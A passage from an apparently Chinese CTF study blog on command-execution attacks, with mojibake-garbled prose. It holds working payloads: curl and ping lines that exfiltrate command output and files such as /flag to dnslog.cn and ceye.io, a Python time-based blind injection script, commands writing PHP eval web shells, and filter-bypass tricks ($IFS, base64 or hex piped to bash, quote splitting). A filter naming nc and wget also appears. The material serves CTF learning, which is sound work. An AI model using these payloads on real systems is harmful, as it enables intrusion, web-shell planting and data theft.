æ³•æ­£å‘è¿æ¥ã€‚ç”±äºæˆ‘ä»¬å¤–ç½‘æœåŠ¡å™¨çš†ä¸º<strong>å…¬ç½‘æœåŠ¡å™¨</strong>ï¼Œæ‰€ä»¥ä¸‰å°PCé¶æœºæ˜¯å¯ä»¥è®¿é—®åˆ°æœåŠ¡å™¨çš„ï¼Œå³å¯ä»¥è¿›è¡Œåå‘è¿æ¥ï¼Œè®©é¶æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢æ¼”ç¤ºçš„bashåå¼¹çš„æ“ä½œã€‚</p><h5 id="æ•°æ®å†™å‡º">æ•°æ®å†™å‡º</h5><p>å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœå†™å…¥å…¶ä»–æ–‡ä»¶ï¼Œå†è®¿é—®å…¶ä»–æ–‡ä»¶è·å–æ‰§è¡Œç»“æœï¼Œä¸‹ä»¥1.txtä¸ºä¾‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨<span class="built_in">cp</span>å‘½ä»¤ï¼š<span class="built_in">cp</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨<span class="built_in">mv</span>å‘½ä»¤ï¼š<span class="built_in">mv</span> flag.php 1.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨&gt;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶ï¼š<span class="built_in">ls</span> &gt; 1.txt</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨<span class="built_in">tee</span>å‘½ä»¤ï¼š<span class="built_in">ls</span> | <span class="built_in">tee</span> 1.txt    //teeä¼šä»ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶å†™å…¥æ–‡ä»¶ä»¥åŠæ ‡å‡†è¾“å‡º</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨scriptå‘½ä»¤ï¼š<span class="built_in">ls</span> | script 1.txt  //ä¼šå¼€å¯å‘½ä»¤è®°å½•ï¼Œå‘½ä»¤æ‰§è¡ŒçŠ¶æ€ä»¥åŠç»“æœéƒ½å°†ä¼šå†™å…¥æ–‡ä»¶ä¸­</span><br></pre></td></tr></table></figure><h5 id="æ•°æ®å¤–å¸¦">æ•°æ®å¤–å¸¦</h5><p>åœ¨é¢˜ç›®ç¯å¢ƒå‡ºç½‘çš„æ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ•°æ®å¤–å¸¦å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœå¤–å¸¦å‡ºæ¥ï¼Œæ­¤å¤„æ¨èä¸¤ä¸ªå¤–å¸¦ç½‘å€ï¼š</p><p>1.<a href="http://dnslog.cn">http://dnslog.cn</a></p><p>2.<a href="http://ceye.io/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%8C%E6%9B%B4%E7%A8%B3%E5%AE%9A%EF%BC%89">http://ceye.io/ï¼ˆæ¨èï¼Œæ›´ç¨³å®šï¼‰</a></p><p>linuxçš„æ•°æ®å¤–å¸¦å½’åŠŸäºå…¶åå¼•å·å¯æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤è¿™ä¸€ç‰¹æ®Šæœºåˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">å•è¡Œä¼ è¾“ï¼š</span><br><span class="line">ping `<span class="built_in">whoami</span>`.dnsåœ°å€</span><br><span class="line">curl http://dnsåœ°å€/`<span class="built_in">whoami</span>`</span><br><span class="line"></span><br><span class="line">//whoamiå³ä¸ºæˆ‘ä»¬è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œå°†å…¶ç”¨``åŒ…è£¹ååˆ©ç”¨.å°†å…¶ä¸æˆ‘ä»¬çš„dnsåœ°å€è¿›è¡Œæ‹¼æ¥ï¼Œæ‰§è¡Œå‘½ä»¤åå³å¯åœ¨dnså¤„å¾—åˆ°<span class="built_in">whoami</span>å‘½ä»¤çš„å›æ˜¾</span><br><span class="line"></span><br><span class="line">å¤šè¡Œä¼ è¾“ï¼š(å¤–å¸¦åªä¼šæ˜¾ç¤ºç¬¬ä¸€è¡Œçš„æ•°æ®)</span><br><span class="line">curl http://y91yp4.ceye.io/`<span class="built_in">ls</span> / | <span class="built_in">base64</span>`     //å°†ç»“æœè¿›è¡Œ<span class="built_in">base64</span>ç¼–ç åå¤–å¸¦å‡ºæ¥</span><br><span class="line">curl http://y91yp4.ceye.io/`<span class="built_in">whoami</span> | sed -n <span class="string">&#x27;2p&#x27;</span>`    //è¾“å‡ºå›ºå®šè¡Œçš„ç»“æœ</span><br><span class="line">curl -T /flag http://y91yp4.ceye.io/      //æŒ‡å®šæ–‡ä»¶å¤–å¸¦</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä¼šå°±è¿™ä¸¤ä¸ªå¤–å¸¦å¹³å°è¿›è¡Œæ¼”ç¤º</p><p><strong>1.dnslog</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123182359664.png" alt="image-20240123182359664"></p><p>é¦–å…ˆç‚¹å‡»get subdomainï¼Œå³å¯è·å¾—2æ‰€ç¤ºçš„urlåœ°å€ï¼Œéšåå³å¯åœ¨é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.dnsåœ°å€</span><br><span class="line">ping `whoami`.b854kz.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123182554193.png" alt="image-20240123182554193"></p><p>ç‚¹å‡ ä¸‹refresh recordï¼ˆç‚¹æˆgetå°±å¾—é‡æ–°æäº†ï¼‰å³å¯è·å¾—å›æ˜¾ï¼Œå¯ä»¥å¾—åˆ°é¶æœºå½“å‰ç”¨æˆ·ä¸ºroot</p><p><strong>2.ceye</strong></p><p>å¹³å°å´©äº†ï¼Œå°å¯„ã€‚</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240123183023358.png" alt="image-20240123183023358"></p><p>loginå¤„ç™»å½•ååº”ä¸ºprofileï¼Œåœ¨profileå‡ºå¾—åˆ°urlåœ°å€åå³å¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//y</span>91yp4.ceye.io<span class="regexp">/`ls /</span> | base64` </span><br></pre></td></tr></table></figure><p>ç‚¹å‡ ä¸‹reloadå³å¯å¾—åˆ°å›æ˜¾ç»“æœ</p><h5 id="ç›²æ³¨">ç›²æ³¨</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://localhost.test.php/?c=&#x27;</span></span><br><span class="line">dic=string.printable[:-<span class="number">6</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    judge=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        now=<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>a=$(cat /flag | head -1 | cut -b <span class="subst">&#123;i&#125;</span>);if [ $a = <span class="subst">&#123;j&#125;</span> ];then sleep 2;fi&#x27;</span></span><br><span class="line">        start=time.time()</span><br><span class="line">        r=requests.get(now)</span><br><span class="line">        end=time.time()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(end)-<span class="built_in">int</span>(start) &gt;<span class="number">1</span>:</span><br><span class="line">            judge=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> judge==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒå‘½ä»¤åˆ†æ</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -1 | <span class="built_in">cut</span> -b &#123;i&#125;);<span class="keyword">if</span> [ <span class="variable">$a</span> = &#123;j&#125; ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸€éƒ¨åˆ†</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -1 | <span class="built_in">cut</span> -b &#123;i&#125;);</span><br><span class="line">å®šä¹‰å˜é‡aï¼Œå°†<span class="built_in">cat</span> /flagçš„ç»“æœåˆ©ç”¨<span class="built_in">head</span> -1å–ç¬¬ä¸€è¡Œï¼Œåˆ©ç”¨<span class="built_in">cut</span> -b numberå–ç»“æœçš„ç¬¬iï¼ˆè„šæœ¬ä¸­çš„å¾ªç¯iï¼‰ä¸ªå­—ç¬¦ï¼Œå°†å­—ç¬¦èµ‹å€¼ç»™a</span><br></pre></td></tr></table></figure><p><strong>ç¬¬äºŒéƒ¨åˆ†</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if <span class="selector-attr">[ $a = &#123;j&#125; ]</span>;</span><br><span class="line">åˆ¤æ–­å¾—åˆ°çš„å˜é‡<span class="selector-tag">a</span>æ˜¯å¦ç­‰äºjï¼Œjä¸ºä¸Šè¿°è„šæœ¬ä¸­dicå­—å…¸çš„éå†ç»“æœ</span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰éƒ¨åˆ†</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br><span class="line">å¦‚æœåˆ¤æ–­ä¸ºçœŸï¼Œåˆ™ç¡çœ 2ç§’ï¼Œé€šè¿‡ç½‘é¡µæ˜¯å¦ç¡çœ åˆ¤æ–­å‡ºflagçš„æ¯ä¸ªå­—æ¯çš„ç»“æœ</span><br></pre></td></tr></table></figure><h5 id="å‘½ä»¤è¡Œå†™shell">å‘½ä»¤è¡Œå†™shell</h5><p>å¯ä»¥é€šè¿‡å‘½ä»¤æ‰§è¡Œå†™å…¥shellï¼Œç„¶åèšå‰‘è¿æ¥ï¼Œåœ¨æŸäº›æƒ…å†µä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=&#x27; | base64 -d &gt; ./123.php  </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">//base64è§£ç ç»“æœä¸º</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; /var/www/html/2.php</span></span><br></pre></td></tr></table></figure><h4 id="é•¿åº¦é™åˆ¶ç»•è¿‡">é•¿åº¦é™åˆ¶ç»•è¿‡</h4><p>ç¤ºä¾‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æ­¤é¢˜åˆ©ç”¨substrå‡½æ•°å¯¹evalçš„ä»£ç è¿›è¡Œäº†é™åˆ¶</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getä¼ å‚   F=<span class="string">`$F `</span>; <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">ç»è¿‡<span class="keyword">substr</span>($F,<span class="number">0</span>,<span class="number">6</span>)æˆªå–å å¾—åˆ°  <span class="string">`$F `</span>;</span><br><span class="line">ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ <span class="keyword">eval</span>(<span class="string">&quot;`$F `;&quot;</span>);</span><br><span class="line">æˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å»</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``$F `;sleep 3`&quot;</span>);</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ  <span class="string">` `</span>$F <span class="string">`;sleep 3 `</span> == shell_exec(<span class="string">&quot;`$F `; sleep 3&quot;</span>);</span><br><span class="line">å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚</span><br><span class="line">è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">æ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº†ï¼Œå°†<span class="keyword">sleep</span> <span class="number">3</span>æ¢æˆæˆ‘ä»¬<span class="number">2.1</span>.<span class="number">1</span>èŠ‚ä¸­æ‰€è®²çš„æ“ä½œå³å¯å¾—åˆ°ç­”æ¡ˆ</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤ç»•è¿‡">å‘½ä»¤ç»•è¿‡</h4><h5 id="ç©ºæ ¼">ç©ºæ ¼</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span>              </span><br><span class="line"></span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;                        <span class="literal">--</span>è¿™é‡ŒæŠŠï¼Œæ›¿æ¢æˆäº†ç©ºæ ¼é”®</span><br><span class="line"></span><br><span class="line">%<span class="number">20</span>                                   <span class="literal">--</span>ä»£è¡¨spaceé”®</span><br><span class="line"></span><br><span class="line">\x20  <span class="literal">--</span>ä»£è¡¨spaceé”®ï¼Œevalç±»ä¸­å¯ç”¨</span><br><span class="line"></span><br><span class="line">%<span class="number">09</span>           <span class="literal">--</span>éœ€è¦phpç¯å¢ƒï¼Œå¦‚<span class="built_in">cat</span>%<span class="number">09</span>flag.php</span><br><span class="line"></span><br><span class="line">\x09  <span class="literal">--</span>ä»£è¡¨spaceé”®ï¼Œevalç±»ä¸­å¯ç”¨</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;  <span class="literal">--</span>å•çº¯<span class="built_in">cat</span><span class="variable">$IFS2</span>,IFS2è¢«bashè§£é‡Šå™¨å½“åšå˜é‡åï¼Œè¾“ä¸å‡ºæ¥ç»“æœï¼ŒåŠ ä¸€ä¸ª&#123;&#125;å°±å›ºå®šäº†å˜é‡åï¼Œå¦‚<span class="built_in">cat</span><span class="variable">$</span>&#123;IFS2&#125;flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span>  <span class="literal">--</span>åé¢åŠ ä¸ª<span class="variable">$</span>ä¸&#123;&#125;ç±»ä¼¼ï¼Œèµ·æˆªæ–­ä½œç”¨ï¼Œ<span class="variable">$9</span>æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå¦‚<span class="built_in">cat</span><span class="variable">$IFS2</span><span class="variable">$9flag</span>.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;    <span class="literal">--</span>é‡å®šå‘ï¼Œå¦‚<span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"></span><br><span class="line">&lt;&gt;       <span class="literal">--</span>é‡å®šå‘ï¼Œå¦‚<span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure><h5 id="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡">å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span><span class="operator">=</span>l<span class="comment">;b=s;c=/;$a$b $c</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰å˜é‡aä¸ºlï¼Œbä¸ºsï¼Œcä¸º/ï¼Œæ‰§è¡Œå‘½ä»¤$a$b $cå³ls /</p><h5 id="base64ç¼–ç ç»•è¿‡">base64ç¼–ç ç»•è¿‡</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> MTIzCg==|<span class="built_in">base64</span> -d å…¶å°†ä¼šæ‰“å°123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | bash </span><br><span class="line">`<span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d`                   ==&gt;ä¸‰ç§ç»“æœçš†ä¸º<span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | sh</span><br></pre></td></tr></table></figure><h5 id="16è¿›åˆ¶ç¼–ç ç»•è¿‡">16è¿›åˆ¶ç¼–ç ç»•è¿‡</h5><p>ç”Ÿæˆè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);  <span class="comment">//6c73202f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">6</span>c73202f | <span class="type">xxd</span> -r -p | <span class="type">bash</span></span><br><span class="line">`echo <span class="number">6</span>c73 | <span class="type">xxd</span> -r -p`</span><br><span class="line">echo `<span class="number">6</span>c73202f` | <span class="type">xxd</span> -r -p | <span class="type">sh</span> &gt; <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h5 id="å•åŒå¼•å·ç»•è¿‡">å•åŒå¼•å·ç»•è¿‡</h5><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t <span class="built_in">flag</span> </span><br><span class="line">ca<span class="string">&quot;&quot;</span>t <span class="built_in">flag</span></span><br><span class="line">l<span class="string">&#x27;&#x27;</span>s /</span><br><span class="line">l<span class="string">&quot;&quot;</span>s /</span><br></pre></td></tr></table></figure><h5 id="åæ–œæ ç»•è¿‡">åæ–œæ ç»•è¿‡</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l<span class="string">\s</span> /</span><br><span class="line">l<span class="string">\s</span> /<span class="keyword">var</span>/www/ht<span class="string">\ml</span></span><br><span class="line">ca<span class="string">\t</span> f<span class="string">\ag</span></span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡ipä¸­çš„å¥ç‚¹">ç»•è¿‡ipä¸­çš„å¥ç‚¹</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ç»œåœ°å€å¯ä»¥è½¬æ¢æˆæ•°å­—åœ°å€ï¼Œæ¯”å¦‚<span class="number">127.0</span>.<span class="number">0.1</span>å¯ä»¥è½¬åŒ–ä¸º<span class="number">2130706433</span>ã€‚</span><br><span class="line">å¯ä»¥ç›´æ¥è®¿é—®http:<span class="regexp">//</span><span class="number">2130706433</span>æˆ–è€…http:<span class="regexp">//</span><span class="number">0</span>x7F000001ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡.çš„ipè¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">æ•°å­—è½¬ipåœ°å€</a></p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">ipåœ°å€è½¬æ•°å­—</a></p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">åŸŸåè½¬æ•°å­—ip</a></p><h5 id="æ­£åˆ™åŒ¹é…ç»•è¿‡">æ­£åˆ™åŒ¹é…ç»•è¿‡</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag  =&gt;   <span class="built_in">cat</span> [e-g]lag</span><br><span class="line">   <span class="built_in">cat</span> f&#123;k..m&#125;ag</span><br></pre></td></tr></table></figure><p>ä¸¤ç§æ­£åˆ™åŒ¹é…ç¨æœ‰ä¸åŒï¼š</p><p>1.[]ä¸ºå¼€åŒºé—´ï¼Œå¹¶<strong>ä¸åŒ…å«</strong>å·¦å³è¾¹ç•Œ</p><p>2.{}ä¸ºé—­åŒºé—´ï¼Œ<strong>åŒ…å«</strong>å·¦å³è¾¹ç•Œ</p><p>æ‰€ä»¥å¯å¾—ï¼Œå‰è€…åªä¼šåŒ¹é…fï¼Œè€Œåè€…ä¼šåŒ¹é…k,l,m</p><h5 id="å†…æ•›æ‰§è¡Œæ³•ç»•è¿‡">å†…æ•›æ‰§è¡Œæ³•ç»•è¿‡</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> `<span class="built_in">ls</span>`</span><br><span class="line">//è·å–<span class="built_in">ls</span>ä¸‹çš„æ‰€æœ‰çš„æ–‡ä»¶å†…å®¹</span><br></pre></td></tr></table></figure><h5 id="é»‘æ´ç»•è¿‡">é»‘æ´ç»•è¿‡</h5><p><strong>é»‘æ´ï¼š</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="regexp">/dev/</span><span class="keyword">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">&gt;ä»£è¡¨é‡å®šå‘ï¼Œä¼šå°†æˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„æ‰€æœ‰ç»“æœå…¨éƒ¨ä¸¢è¿›é¢„å®šä¹‰çš„<span class="regexp">/dev/</span><span class="keyword">null</span>è¿™ä¸€åƒåœ¾æ¡¶ä¸­ï¼Œå¯¼è‡´æˆ‘ä»¬æ”¶ä¸åˆ°å›æ˜¾</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç®¡é“ç¬¦ç»•è¿‡,æ•ˆæœè¯¦è§1.1èŠ‚</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls || &gt;<span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡open-basedir">ç»•è¿‡open_basedir()</h5><p><strong>1.ini_seté‡è®¾ç½®ç»•è¿‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è®¾ç½® open_basedir</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/path/to/allowed/directory:/another/allowed/directory&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥è®¾ç½®å¤šä¸ªå®‰å…¨ç›®å½•ï¼Œç›®å½•å’Œç›®å½•ä¹‹é—´å¯ä»¥ä½¿ç”¨:è¿›è¡Œåˆ†éš”</p><p><strong>2.UAFè„šæœ¬ç»•è¿‡å®‰å…¨ç›®å½•</strong></p><p>ä½¿ç”¨æ—¶éœ€è¦è¿›è¡Œurlç¼–ç å†ä¼ å…¥ï¼ˆbpç¼–ç ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 